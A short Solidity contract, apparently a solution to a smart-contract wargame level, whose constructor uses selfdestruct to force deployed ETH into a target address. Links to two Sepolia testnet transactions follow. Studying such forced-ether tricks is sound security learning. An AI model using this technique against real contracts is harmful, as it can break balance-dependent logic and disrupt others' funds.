// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    // 1. Destroys the contract
    // 2. Forces ALL ETH to target

    constructor(address payable _target) payable {
        // msg.value > 0 because we sent ETH on deployment ✅
        selfdestruct(_target);
    }
}

// https://sepolia.etherscan.io/tx/0xa5667cb49ee31ab9d6cddd2a7fca1443f20008210db10dded504212071246938

// https://sepolia.etherscan.io/tx/0x6798d2794d7afb701c682565311bbfa1547b63709d68cddf16a0e386ac5669ca